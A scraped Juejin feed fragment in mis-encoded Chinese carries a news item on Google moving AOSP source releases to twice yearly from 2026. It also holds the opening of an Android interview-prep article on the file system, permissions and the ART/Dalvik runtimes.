<p>å¸‚é¢ä¸Šæ¯ä¸€æ¬¾å®‰å“æ‰‹æœºä¸å¹³æ¿æ‰€æ­è½½çš„æ“ä½œç³»ç»Ÿï¼Œå‡åŸºäº <strong>AOSP</strong>ï¼ˆå³ Android å¼€æºé¡¹ç›®ï¼‰å¼€å‘ã€‚è°·æ­Œä»¥å®½æ¾çš„ Apache 2.0 è®¸å¯è¯å‘å¸ƒ <strong>AOSP</strong> ä»£ç ï¼Œå¼€å‘è€…æ— éœ€ä»˜è´¹ï¼Œä¹Ÿä¸å¿…å…¬å¼€è‡ªèº«çš„ä¿®æ”¹ç‰ˆæœ¬ï¼Œå³å¯åŸºäºè¯¥é¡¹ç›®å¼€å‘ã€ä¿®æ”¹å¹¶åˆ†å‘è‡ªæœ‰æ“ä½œç³»ç»Ÿã€‚</p>
<p>è‡ª <strong>AOSP</strong> é¡¹ç›®å¯åŠ¨ä»¥æ¥ï¼Œè°·æ­Œå‡ ä¹ä¼šåœ¨æ¯ä¸€ä»£ç§»åŠ¨è®¾å¤‡å®‰å“ç³»ç»Ÿç‰ˆæœ¬å‘å¸ƒåï¼ŒåŒæ­¥å¼€æ”¾å¯¹åº”çš„æºä»£ç ï¼Œé€šå¸¸åœ¨è‡ªå®¶ Pixel ç³»åˆ—è®¾å¤‡æ¨é€æ›´æ–°åçš„æ•°å¤©å†…å°±ä¼šå®Œæˆå¼€æºæ“ä½œã€‚</p>
<p>ç„¶è€Œä»ä»Šå¹´èµ·ï¼Œè°·æ­Œå¯¹å®‰å“æºä»£ç çš„å‘å¸ƒè®¡åˆ’åšå‡ºé‡å¤§è°ƒæ•´ï¼š<strong>AOSP</strong> æºä»£ç å°†æ”¹ä¸ºæ¯å¹´ä»…å‘å¸ƒä¸¤æ¬¡ã€‚</p>
<p>æ®è°·æ­Œé€éœ²ï¼Œè‡ª 2026 å¹´èµ·ï¼Œ<strong>AOSP</strong> æ–°æºä»£ç å°†å›ºå®šåœ¨æ¯å¹´ç¬¬äºŒå­£åº¦ï¼ˆQ2ï¼‰ä¸ç¬¬å››å­£åº¦ï¼ˆQ4ï¼‰å‘å¸ƒã€‚è°ƒæ•´çš„ç›®çš„æ˜¯ä¿éšœå®‰å“ç”Ÿæ€çš„å¹³å°ç¨³å®šæ€§ï¼Œå¹¶æ›´å¥½åœ°é€‚é…å®‰å“çš„ä¸»å¹²ç¨³å®šå¼€å‘æ¨¡å¼ã€‚</p>
<p>å¦‚ä»Šè®¿é—® <a href="https://link.juejin.cn?target=https%3A%2F%2Fsource.android.com%2Fdocs%2Fwhatsnew%2Fsite-updates%3Fhl%3Dzh-cn%26year%3D2025" target="_blank" title="https://source.android.com/docs/whatsnew/site-updates?hl=zh-cn&amp;year=2025" ref="nofollow noopener noreferrer">source.android.com</a>ï¼Œä¼šçœ‹åˆ°ä¸€åˆ™ç¡®è®¤è¯¥å˜åŠ¨çš„å…¬å‘Šæ¨ªå¹…ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p>
<blockquote>
<p>è‡ª 2026 å¹´èµ·ï¼Œä¸ºäº†ä¸æˆ‘ä»¬çš„ä¸»å¹²ç¨³å®šå¼€å‘æ¨¡å‹ä¿æŒä¸€è‡´ï¼Œå¹¶ç¡®ä¿ç”Ÿæ€ç³»ç»Ÿçš„å¹³å°ç¨³å®šæ€§ï¼Œæˆ‘ä»¬å°†åœ¨ç¬¬ 2 å­£åº¦å’Œç¬¬ 4 å­£åº¦å°†æºä»£ç å‘å¸ƒåˆ° AOSPã€‚å¯¹äºæ„å»º AOSP å’Œå‘ AOSP è´¡çŒ®ä»£ç ï¼Œæˆ‘ä»¬å»ºè®®ä½¿ç”¨ <code>android-latest-release</code> è€Œä¸æ˜¯ <code>aosp-main</code>ã€‚<code>android-latest-release</code> æ¸…å•åˆ†æ”¯å°†å§‹ç»ˆå¼•ç”¨æ¨é€åˆ° AOSP çš„æœ€æ–°ç‰ˆæœ¬ã€‚å¦‚éœ€äº†è§£è¯¦æƒ…ï¼Œè¯·å‚é˜… <a href="https://link.juejin.cn?target=https%3A%2F%2Fsource.android.com%2Fdocs%2Fwhatsnew%2Fsite-updates%3Fhl%3Dzh-cn%23aosp-changes" target="_blank" title="https://source.android.com/docs/whatsnew/site-updates?hl=zh-cn#aosp-changes" ref="nofollow noopener noreferrer">AOSP å˜æ›´</a>ã€‚</p>
</blockquote>
<p>è¿‡å»ï¼Œè°·æ­Œä¼šé…åˆå®‰å“ç³»ç»Ÿçš„å­£åº¦æ›´æ–°å‘å¸ƒæºä»£ç ï¼Œä¸€å¹´æ€»è®¡å››æ¬¡ã€‚æ­¤æ¬¡è°ƒæ•´åï¼Œå‘å¸ƒé¢‘æ¬¡ä»ä¸€å¹´å››æ¬¡ç¼©å‡ä¸ºä¸¤æ¬¡ï¼Œèšç„¦äºç¬¬äºŒå­£åº¦çš„é‡å¤§æ›´æ–°ä¸ç¬¬å››å­£åº¦çš„å°å¹…æ›´æ–°ï¼Œè¿™ä¸¤ä¸ªç‰ˆæœ¬éƒ½ä¼šåŒ…å«é¢å‘å¼€å‘è€…çš„åŠŸèƒ½å˜æ›´ã€‚</p>
<p>è°·æ­Œå‘è¨€äººå°±è¿™ä¸€å†³ç­–è¡¥å……è¯´æ˜ï¼Œè°ƒæ•´æœ‰åŠ©äºç®€åŒ–å¼€å‘æµç¨‹ï¼Œé™ä½å¤šä»£ç åˆ†æ”¯çš„ç®¡ç†å¤æ‚åº¦ï¼Œä¸ºå®‰å“å¹³å°å¼€å‘è€…æä¾›æ›´ç¨³å®šã€æ›´å®‰å…¨çš„ä»£ç ã€‚</p>
<p>å‘è¨€äººåŒæ—¶å¼ºè°ƒï¼Œè°·æ­Œå¯¹ <strong>AOSP</strong> çš„æŠ•å…¥æ‰¿è¯ºä¸ä¼šæ”¹å˜ï¼Œæ–°çš„å‘å¸ƒè®¡åˆ’å°†åŠ©åŠ›å®‰å“ç”Ÿæ€æ„å»ºæ›´åšå®ã€æ›´å®‰å…¨çš„æŠ€æœ¯åº•åº§ã€‚æ­¤å¤–ï¼Œè°·æ­Œæ˜ç¡®è¡¨ç¤ºå®‰å…¨è¡¥ä¸çš„å‘å¸ƒæµç¨‹ä¿æŒä¸å˜ï¼Œä»ä¼šåƒç°åœ¨è¿™æ ·ï¼Œæ¯æœˆåœ¨ä¸“å±çš„å®‰å…¨è¡¥ä¸åˆ†æ”¯ä¸ºç›¸å…³ç³»ç»Ÿç‰ˆæœ¬æ¨é€æ›´æ–°ã€‚</p>
<blockquote>
<p>åŸæ–‡<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.androidauthority.com%2Faosp-source-code-schedule-3630018%2F" target="_blank" title="https://www.androidauthority.com/aosp-source-code-schedule-3630018/" ref="nofollow noopener noreferrer">www.androidauthority.com/aosp-sourceâ€¦</a></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åˆçº§ä¸ä¸­çº§çš„Androidé¢è¯•é¢˜åŒºåˆ«åœ¨å“ªé‡Œ]]></title>    <link>https://juejin.cn/post/7592432859863384098</link>    <guid>https://juejin.cn/post/7592432859863384098</guid>    <pubDate>2026-01-08T00:27:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592432859863384098" data-draft-id="7590309337861439529" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åˆçº§ä¸ä¸­çº§çš„Androidé¢è¯•é¢˜åŒºåˆ«åœ¨å“ªé‡Œ"/> <meta itemprop="keywords" content="Kotlin,Android"/> <meta itemprop="datePublished" content="2026-01-08T00:27:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="RockByte"/> <meta itemprop="url" content="https://juejin.cn/user/1046390797768519"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åˆçº§ä¸ä¸­çº§çš„Androidé¢è¯•é¢˜åŒºåˆ«åœ¨å“ªé‡Œ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1046390797768519/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    RockByte
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T00:27:40.000Z" title="Thu Jan 08 2026 00:27:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»20åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{position:relative;word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;color:#282d36}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px;color:#2f845e}.markdown-body h2{font-size:22px;display:inline-block;font-weight:700;background:#2f845e;color:#fff;padding:6px 8px 0 0;border-top-right-radius:6px;margin-right:2px;box-shadow:6px 3px 0 0 rgba(47,132,194,.2)}.markdown-body h2:before{content:" ";display:inline-block;width:8px}.markdown-body h2:after{content:" ";position:absolute;display:block;width:calc(100% - 32px);border-bottom:3px solid #2f845e}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%;box-shadow:6px 6px 6px #888}.markdown-body hr{border:none;border-top:1px solid rgba(66,185,131,.15);margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#f6ffed;color:#52c41a;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:16px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#262626;border:1px solid #2f845e;border-top:8px solid #2f845e;background:linear-gradient(180deg,rgba(66,185,131,.1),transparent)!important}.markdown-body pre&gt;code.hljs[lang]:before{top:8px!important;color:#2f845e!important}.markdown-body pre&gt;code.language-awesome_error{border:1px solid #ff4d4f!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#ff4d4f!important;background:#fff2f0!important}.markdown-body pre&gt;code.language-awesome_error:before{content:"!"!important;position:absolute!important;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#ff4d4f!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body pre&gt;code.language-awesome_warn{border:1px solid #ffc46f!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#ffc46f!important;background:#fffbe6!important}.markdown-body pre&gt;code.language-awesome_warn:before{content:"â˜‚"!important;position:absolute;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#ffc46f!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body pre&gt;code.language-awesome_success{border:1px solid #52c41a!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#52c41a!important;background:#f6ffed!important}.markdown-body pre&gt;code.language-awesome_success:before{content:"âœ“"!important;position:absolute!important;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#52c41a!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body pre&gt;code.language-awesome_info{border:1px solid #1890ff!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#1890ff!important;background:#e6f7ff!important}.markdown-body pre&gt;code.language-awesome_info:before{content:"i"!important;position:absolute!important;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#1890ff!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body strong{background-color:inherit;color:#2f845e}.markdown-body em{background-color:inherit;color:#949415}.markdown-body a{text-decoration:none;color:#2f8e54;border-bottom:1px solid #3f9e64}.markdown-body a:active,.markdown-body a:hover{color:#3f9e64}.markdown-body a[class^=footnote]{margin-left:4px}.markdown-body a:before{content:"â¤ "}.markdown-body table{font-size:12px;width:100%;max-width:100%;overflow:auto;border:2px solid #2f8e54}.markdown-body thead{background:#2f8e54;color:#fff;text-align:left;font-weight:700}.markdown-body tr:nth-child(2n){background-color:rgba(153,255,188,.1)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:22px}.markdown-body td{min-width:120px}.markdown-body blockquote{padding:1px 22px;margin:22px 0;border-left:6px solid #2f845e;background-color:rgba(66,185,131,.1);border-radius:2px}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#2f845e}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px;color:#282d36}.markdown-body del{color:#2f845e}.markdown-body input[type=checkbox]:checked:before{content:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAA/klEQVQ4T72TMU7DQBBF318XdFR06egQEnAXRINEGlqgowoIR8AF4AZOZ4JEGq5AC5EixBU4A55BNrEVHAcSBTHlaubt37/zxZKlcn7n6mDPXJvz8IJ89HzWu8t7C8D2dfsY52ae4apHnLx0ktsCsHXZjiUuFgG40x2eJ/H/AhztB+zDUTpLwWj8jGkzxSHiHaMPrDQC8sMoilKzLAUqiKQjmb+ZuAdW80tmelCHODoNgSfP7AFprTTaRTzsJN1GEyuIZ7uW6TEEHwCtyV/6EVBKJHhfzgC0Xv/iXwEFBF4FG0378bd7sPQq5xK/hSnk6sdlX3mZrKkwLZKBeu8n9XuWEUE7X+YAAAAASUVORK5CYII=);position:relative;top:-1px;left:-1px}.markdown-body .math .katex{font-family:Menlo,Monaco,Consolas,Courier New,monospace;word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#f6ffed;color:#52c41a;font-size:.87em;padding:.065em .4em}@media (max-width:720px){.markdown-body h1{font-size:22px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="xcode">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff;color:#000}.xml .hljs-meta{color:silver}.hljs-comment,.hljs-quote{color:#007400}.hljs-attribute,.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-tag{color:#aa0d91}.hljs-template-variable,.hljs-variable{color:#3f6e74}.hljs-code,.hljs-meta-string,.hljs-string{color:#c41a16}.hljs-link,.hljs-regexp{color:#0e0eff}.hljs-bullet,.hljs-number,.hljs-symbol,.hljs-title{color:#1c00cf}.hljs-meta,.hljs-section{color:#643820}.hljs-built_in,.hljs-builtin-name,.hljs-class .hljs-title,.hljs-params,.hljs-type{color:#5c2699}.hljs-attr{color:#836c28}.hljs-subst{color:#000}.hljs-formula{background-color:#eee;font-style:italic}.hljs-addition{background-color:#baeeba}.hljs-deletion{background-color:#ffc8bd}.hljs-selector-class,.hljs-selector-id{color:#9b703f}.hljs-doctag,.hljs-strong{font-weight:700}.hljs-emphasis{font-style:italic}</style><p><em>æœ¬ç³»åˆ—ä¸ºå°è¯´ã€Šé€†è¢­è¥¿äºŒæ——ã€‹çš„æŠ€æœ¯è®²è§£ï¼Œç”¨äºè¯¦ç»†è¯´æ˜<a href="https://juejin.cn/post/7591702898080841743" target="_blank" title="https://juejin.cn/post/7591702898080841743">å‰§æƒ…</a>é‡Œæ¶‰åŠçš„å¼€å‘ç»†èŠ‚ã€‚</em></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f404616b11d74f0bb61f2a71df107127~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768436859&amp;x-signature=xPICbVkUMgFu3REROHPAFp9Wqk8%3D" alt="11.png" loading="lazy"/></p>
<h2 data-id="heading-0">Android æ–‡ä»¶ç³»ç»Ÿ</h2>
<p>Android æ–‡ä»¶ç³»ç»Ÿæ˜¯ä¸€å¥—ç»“æ„åŒ–ç¯å¢ƒï¼Œè´Ÿè´£ç®¡ç† Android è®¾å¤‡ä¸Šçš„æ•°æ®å­˜å‚¨ï¼Œè®©åº”ç”¨å’Œç”¨æˆ·èƒ½é«˜æ•ˆåœ°å­˜å‚¨ã€è·å–å’Œç®¡ç†æ–‡ä»¶ã€‚</p>
<p>å®ƒåŸºäº Linux æ–‡ä»¶ç³»ç»Ÿæ¶æ„å®ç°ï¼Œæ—¢ä¸ºåº”ç”¨æä¾›äº†ç§æœ‰å’Œå…±äº«çš„å­˜å‚¨ç©ºé—´ï¼Œåˆéµå¾ªä¸¥æ ¼çš„å®‰å…¨ä¸æƒé™æ¨¡å‹ã€‚</p>
<h3 data-id="heading-1">é¢è¯•é—®é¢˜</h3>
<p>Android å¦‚ä½•åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­æ‰§è¡Œå®‰å…¨ä¸æƒé™æ§åˆ¶ï¼Ÿ</p>
<p>æœ‰å“ªäº›æœºåˆ¶èƒ½é˜²æ­¢åº”ç”¨è®¿é—®å…¶ä»–åº”ç”¨çš„ç§æœ‰æ•°æ®ï¼Ÿ</p>
<h3 data-id="heading-2">æ ¸å¿ƒç»„ä»¶</h3>
<p>Android æ–‡ä»¶ç³»ç»ŸåŒ…å«å¤šä¸ªç›®å½•å’Œåˆ†åŒºï¼Œæ¯ä¸ªéƒ½æœ‰æ˜ç¡®çš„ç”¨é€”ï¼š</p>
<ul>
<li><strong>ç³»ç»Ÿåˆ†åŒºï¼ˆ/systemï¼‰</strong>ï¼šå­˜å‚¨æ ¸å¿ƒç³»ç»Ÿæ–‡ä»¶ï¼ŒåŒ…æ‹¬ Android æ¡†æ¶åº“ã€ç³»ç»Ÿåº”ç”¨å’Œé…ç½®æ–‡ä»¶ã€‚è¿™ä¸ªåˆ†åŒºå¯¹æ™®é€šç”¨æˆ·å’Œåº”ç”¨æ˜¯åªè¯»çš„ï¼Œé˜²æ­¢æ„å¤–æˆ–æ¶æ„ä¿®æ”¹ã€‚</li>
<li><strong>æ•°æ®åˆ†åŒºï¼ˆ/dataï¼‰</strong>ï¼šå­˜å‚¨åº”ç”¨ä¸“å±æ•°æ®ï¼Œæ¯”å¦‚æ•°æ®åº“ã€åå¥½è®¾ç½®ã€ç”¨æˆ·ç”Ÿæˆçš„æ–‡ä»¶ã€‚æ¯ä¸ªåº”ç”¨éƒ½æœ‰ç‹¬ç«‹çš„ <code>/data/data/[åŒ…å]</code> ç›®å½•ï¼Œç¡®ä¿æ•°æ®å®‰å…¨ã€‚</li>
<li><strong>ç¼“å­˜åˆ†åŒºï¼ˆ/cacheï¼‰</strong>ï¼šç”¨äºå­˜å‚¨ä¸´æ—¶æ•°æ®ï¼ˆå¦‚ç³»ç»Ÿæ›´æ–°åŒ…ã€ç¼“å­˜æ–‡ä»¶ï¼‰ï¼Œè¿™äº›æ•°æ®ä¸éœ€è¦åœ¨è®¾å¤‡é‡å¯åä¿ç•™ã€‚</li>
<li><strong>å¤–éƒ¨å­˜å‚¨ï¼ˆ/sdcard æˆ– /storageï¼‰</strong>ï¼šæä¾›å¤šåº”ç”¨å¯è®¿é—®çš„å…±äº«å­˜å‚¨ç©ºé—´ï¼Œå¸¸ç”¨äºå­˜æ”¾å›¾ç‰‡ã€è§†é¢‘ã€æ–‡æ¡£ç­‰åª’ä½“æ–‡ä»¶ï¼Œå¯æ˜¯å†…ç½®å­˜å‚¨æˆ–å¯å¸è½½çš„ SD å¡ã€‚</li>
<li><strong>ä¸´æ—¶æ–‡ä»¶ï¼ˆ/tmpï¼‰</strong>ï¼šåº”ç”¨è¿è¡Œæ—¶å­˜å‚¨ä¸´æ—¶æ–‡ä»¶çš„ä½ç½®ï¼Œé€šå¸¸åœ¨åº”ç”¨æˆ–ç³»ç»Ÿé‡å¯åä¼šè¢«æ¸…ç©ºã€‚</li>
</ul>
<h3 data-id="heading-3">Android ä¸­çš„æ–‡ä»¶è®¿é—®æ–¹å¼</h3>
<p>åº”ç”¨é€šè¿‡ Android æ¡†æ¶æä¾›çš„ API ä¸æ–‡ä»¶ç³»ç»Ÿäº¤äº’ã€‚æ ¹æ®æ–‡ä»¶çš„å¯è§æ€§å’Œç”Ÿå‘½å‘¨æœŸéœ€æ±‚ï¼Œåº”ç”¨å¯ä»¥å°†æ–‡ä»¶å­˜åœ¨ä¸åŒä½ç½®ï¼š</p>
<ul>
<li><strong>å†…éƒ¨å­˜å‚¨</strong>ï¼šåº”ç”¨æ²™ç›’å†…çš„ç§æœ‰å­˜å‚¨ï¼Œä»…å½“å‰åº”ç”¨å¯è®¿é—®ï¼Œé€‚åˆå­˜æ”¾æ•æ„Ÿæˆ–åº”ç”¨ä¸“å±æ•°æ®ã€‚</li>
<li><strong>å¤–éƒ¨å­˜å‚¨</strong>ï¼šå¤šåº”ç”¨å¯è®¿é—®çš„å…±äº«å­˜å‚¨ï¼Œç”¨äºå­˜æ”¾ç”¨æˆ·ç”Ÿæˆçš„å†…å®¹æˆ–éœ€è¦åœ¨åº”ç”¨å¤–è®¿é—®çš„åª’ä½“æ–‡ä»¶ã€‚</li>
</ul>
<h3 data-id="heading-4">æ–‡ä»¶æƒé™ä¸å®‰å…¨</h3>
<p>Android æ–‡ä»¶ç³»ç»Ÿå¼ºåˆ¶ä½¿ç”¨ä¸¥æ ¼çš„æƒé™æ¨¡å‹ï¼š</p>
<ul>
<li><strong>åº”ç”¨ç§æœ‰æ•°æ®</strong>ï¼šå­˜åœ¨åº”ç”¨å†…éƒ¨å­˜å‚¨çš„æ•°æ®æ˜¯ç§æœ‰çš„ï¼Œä»…è¯¥åº”ç”¨å¯è®¿é—®ã€‚</li>
<li><strong>å…±äº«æ–‡ä»¶</strong>ï¼šåº”ç”¨é—´å…±äº«æ–‡ä»¶éœ€é€šè¿‡å¤–éƒ¨å­˜å‚¨ï¼Œæˆ–ç»“åˆé€‚å½“æƒé™çš„ <code>Content Provider</code> å®ç°ã€‚</li>
<li><strong>ä½œç”¨åŸŸå­˜å‚¨</strong>ï¼šAndroid 10 å¼•å…¥ï¼Œé™åˆ¶äº†å¯¹å…±äº«å­˜å‚¨çš„ç›´æ¥è®¿é—®ï¼Œè¦æ±‚åº”ç”¨é€šè¿‡ <code>MediaStore</code> æˆ– SAFï¼ˆå­˜å‚¨è®¿é—®æ¡†æ¶ï¼‰API æ“ä½œæ–‡ä»¶ã€‚</li>
</ul>
<h3 data-id="heading-5">æ€»ç»“</h3>
<p>Android æ–‡ä»¶ç³»ç»Ÿæ˜¯ä¸€å¥—å¥å£®ä¸”å®‰å…¨çš„ç¯å¢ƒï¼Œä¸ºåº”ç”¨å’Œç”¨æˆ·ç»„ç»‡ã€ç®¡ç†æ•°æ®å­˜å‚¨ã€‚å®ƒä¸ºç³»ç»Ÿæ–‡ä»¶ã€åº”ç”¨ä¸“å±æ•°æ®å’Œå…±äº«å†…å®¹æä¾›äº†ä¸“ç”¨ç©ºé—´ï¼ŒåŒæ—¶éµå¾ªä¸¥æ ¼çš„å®‰å…¨ä¸æƒé™æ§åˆ¶ã€‚</p>
<p>å¼€å‘è€…é€šè¿‡å„ç±» API ä¸è¯¥ç³»ç»Ÿäº¤äº’ï¼Œå®ç°ç¬¦åˆåº”ç”¨éœ€æ±‚çš„é«˜æ•ˆã€å®‰å…¨çš„æ–‡ä»¶ç®¡ç†ã€‚</p>
<h2 data-id="heading-6">ARTã€Dalvik å’Œ Dex ç¼–è¯‘å™¨</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8453e186fbc24cc9b373d7291c5ccc36~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768436859&amp;x-signature=HtN3aFDmo7d2FZ3cOWpnsQ58Aro%3D" alt="22.jpeg" loading="lazy"/></p>
<p>Android åº”ç”¨ä¾èµ–ç‹¬ç‰¹çš„è¿è¡Œæ—¶ç¯å¢ƒå’Œç¼–è¯‘æµç¨‹åœ¨è®¾å¤‡ä¸Šæ‰§è¡Œï¼Œå…¶ä¸­ Android Runtimeï¼ˆ<strong>ART</strong>ï¼‰ã€<strong>Dalvik</strong> å’Œ <strong>Dex ç¼–è¯‘å™¨</strong> æ˜¯æ ¸å¿ƒè§’è‰²ï¼Œå®ƒä»¬ç¡®ä¿åº”ç”¨åœ¨æ€§èƒ½ã€å†…å­˜æ•ˆç‡å’Œè®¾å¤‡å…¼å®¹æ€§ä¸Šè¾¾åˆ°ä¼˜åŒ–ã€‚</p>
<h3 data-id="heading-7">é¢è¯•é—®é¢˜</h3>
<p><strong>ART</strong> ä¸­çš„æå‰ç¼–è¯‘ï¼ˆ<strong>AOT</strong>ï¼‰ä¸ <strong>Dalvik</strong> ä¸­çš„å³æ—¶ç¼–è¯‘ï¼ˆ<strong>JIT</strong>ï¼‰æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</p>
<p>å¯¹åº”ç”¨å¯åŠ¨é€Ÿåº¦å’Œ CPU å ç”¨æœ‰ä»€ä¹ˆå½±å“ï¼Ÿ</p>
<h3 data-id="heading-8">Android Runtimeï¼ˆARTï¼‰</h3>
<p><strong>ART</strong> æ˜¯ Android 4.4ï¼ˆKitKatï¼‰ä¸­å¼•å…¥çš„æ‰˜ç®¡å¼è¿è¡Œæ—¶ï¼Œä» Android 5.0ï¼ˆLollipopï¼‰å¼€å§‹æˆä¸ºé»˜è®¤è¿è¡Œæ—¶ï¼Œæ›¿ä»£äº† <strong>Dalvik</strong> è´Ÿè´£æ‰§è¡Œ Android åº”ç”¨ï¼Œå¹¶å¸¦æ¥äº†å¤šé¡¹å¢å¼ºã€‚</p>
